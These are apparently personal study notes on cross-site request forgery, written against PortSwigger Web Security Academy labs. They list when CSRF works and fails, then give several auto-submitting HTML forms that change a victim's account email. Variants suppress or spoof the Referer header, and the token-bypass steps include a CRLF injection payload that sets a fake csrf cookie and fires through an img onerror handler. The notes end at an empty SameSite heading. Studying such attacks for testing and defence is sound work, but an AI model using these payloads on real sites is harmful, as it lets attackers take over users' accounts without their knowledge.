## Cross-site request forgery

## CSRF vulnerabilities work when:

- User is Authenticated;
- SameSite=None - allows them to be sent on cross-site requests;

### CSRF does not work when:

- CSRF Tokens are Present;
- Same-Site Cookies are Enabled: With SameSite cookie policy (e.g., SameSite=Lax or Strict), cookies are only sent on requests originating from the same domain;
- Referrer Check: Some sites check the Referer header to confirm requests are from their own pages;
- Origin header (sometimes) - If the site rejects requests without them, it likely relies on header-based protection.

### Standard GET CSRF:
```
<html> 
<body> 
<form action="https://vulnerable-website.com/my-account/change-email"> 
<input type="hidden" name="email" value="evil@gmail.com" /> 
</form> 
<script> document.forms[0].submit(); </script> 
</body>
</html>
```

### Standard POST CSRF:
```
<html> 
<body> 
<form action="https://vulnerable-website.com/my-account/change-email" method="POST"> 
<input type="hidden" name="email" value="evil@gmail.com" /> 
</form> 
<script> document.forms[0].submit(); </script> 
</body>
</html>
```

### Standard POST CSRF with new inputs:
```
<html> 
<body> 
<form action="https://vulnerable-website.com/my-account/change-email" method="POST"> 
<input type="hidden" name="email" value="evil@gmail.com" />
<input type="hidden" name="csrf" value="SDGDSGHRTG$rewt65RT$T4t45" /> 
</form> 
<script> document.forms[0].submit(); </script> 
</body>
</html>
```

### POST CSRF with NoREFFER header:
```
<html>
<head>
<title>CSRF Exploit </title>
  <meta name="referrer" content="no-referrer">
</head>
<body>
  <form action="https://0a2b00a103d9639280702748000e0044.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@err.net" />
    <input type="submit" value="Submit request" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```


```
<html>
<head>
  <title>CSRF Exploit </title>
</head>
<script>history.pushState("", "", "/?0a2b00a103d9639280702748000e0044.web-security-academy.net")</script>
<body>
  <form action="https://0a2b00a103d9639280702748000e0044.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwn234@gmail.com" />
    <input type="submit" value="Submit request" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```
## ByPass Restrictions:

### CSRF:

1) Just delete **csrf** parameter from request.
2) Make a note of the value of the **CSRF** token, then drop the request this is a single-use, so you'll need to include a fresh one.
3) CSRF where token is tied to non-session cookie:
   
   Changing the session cookie logs you out; and
   Changing the csrfKey cookie merely results in the CSRF token being rejected.

   https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie

4) CSRF where token is duplicated in cookie (and if the search term gets reflected in the Set-Cookie header) :

  Create a URL that uses this vulnerability to inject a fake csrf cookie into the victim's browser:
  ```
  /?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
  ```
  
  Remove the auto-submit <script> block from **Standard CSRF** and instead add the following code to inject the cookie and submit the form:
  ```
  <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  ```

  https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie

### SameSite:
